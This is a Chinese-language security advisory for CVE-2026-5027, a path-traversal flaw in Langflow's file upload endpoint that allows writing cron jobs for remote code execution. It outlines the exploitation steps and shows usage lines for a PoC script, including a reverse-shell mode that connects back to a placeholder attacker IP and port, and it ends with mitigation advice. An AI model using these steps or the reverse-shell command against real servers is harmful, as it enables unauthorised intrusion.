**文章来源为：AI agent 自动采集整理**

**严重程度：** High
**CVSS：** 8.8
**影响版本：** Langflow <= 1.8.4
**公开日期：** 2026-04-02

### 漏洞描述
Langflow 是一个流行的开源低代码 AI 应用开发平台。CVE-2026-5027 存在于 /api/v2/files 文件上传端点，由于 upload_user_file() 函数直接将客户端提供的 file.filename 传递给存储服务而未做路径清理，攻击者可通过 ../ 路径穿越序列将文件写入服务器任意位置。在默认开启 auto-login 的部署中，无需认证即可利用，通过写入 cron 任务实现 RCE。

### POC/利用
```python
# 漏洞根因：src/backend/base/langflow/api/v2/files.py
# upload_user_file() 直接使用 file.filename，未清理路径穿越
# LocalStorageService.save_file() 构造路径：folder_path / file_name
# 未阻止目录穿越

# 利用方式：
# 1. 发送 POST /api/v2/files，multipart filename 包含 ../
# 2. 写入 /etc/cron.d/ 或其他敏感位置
# 3. 执行任意命令

# PoC 使用：
# 验证模式（写测试文件到 /tmp/）
python3 exploit.py -t http://target:7860

# 带认证（auto-login 关闭时）
python3 exploit.py -t http://target:7860 -u admin -p password

# 反弹 Shell（通过 cron 注入）
python3 exploit.py -t http://target:7860 --lhost YOUR_IP --lport 4444
```

### 修复建议
1. 升级到 Langflow > 1.8.4
2. 禁用 auto-login，强制认证
3. 使用反向代理限制文件上传路径访问
